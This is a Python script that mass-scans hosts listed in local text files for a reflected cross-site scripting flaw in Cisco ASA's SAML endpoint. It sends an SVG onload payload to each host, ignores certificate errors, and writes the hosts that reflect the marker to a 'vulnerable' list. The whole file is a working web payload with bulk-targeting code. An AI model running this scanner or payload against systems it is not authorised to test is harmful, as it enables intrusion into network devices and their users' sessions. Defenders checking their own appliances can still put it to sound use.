import colorama
import requests
import urllib3
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

colorama.init()
RED = '\033[31m'
GREEN = "\033[32m"
PURPLE = "\033[0;35m"
RESET = '\033[0m'


class Cisco:
    def asa_xss(self):
        turl = "https://" + self.url + "/+CSCOE+/saml/sp/acs?tgname=a"
        theaders = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length':  '44'
        }
        data = 'SAMLResponse=\\"><svg/onload=alert(\'PTSwarm\')>'
        tresponse = requests.post(
            turl, headers=theaders, data=data, verify=False, timeout=10)

        return tresponse

    def __init__(self, url):
        self.url = url


if not os.path.exists('output'):
    os.makedirs('output')
fileList1 = os.listdir(os.getcwd())
inputFileList = []
for i in fileList1:
    if i[-3:] == "txt":
        inputFileList.append(i)
    else:
        pass

for file in inputFileList:

    file1 = open(file, 'r')
    count = 0

    # Using for loop

    for line in file1:
        count += 1
        # Closing files
        url = line.strip()
        try:
            asa_result = Cisco(url)
            output = asa_result.asa_xss()
            sub1 = "PTSwarm"
            if sub1 in output.text:
                print(url+"-->"+RED + " is vulnerable"+RESET)
                vulfile = str(file[0:-4]+'-Vul.txt')
                completeName = os.path.join("output", vulfile)
                f = open(completeName, 'a')
                f.write(url+'\n')
                f.close()
            else:
                print(url+"-->"+GREEN + "Not vulnerable"+RESET)
        except:
            print(url+"-->"+PURPLE + " not accessible"+RESET)
            completeName = os.path.join("output", "ignored.txt")
            f = open(completeName, 'a')
            f.write(url+'\n')
            f.close()

    file1.close()
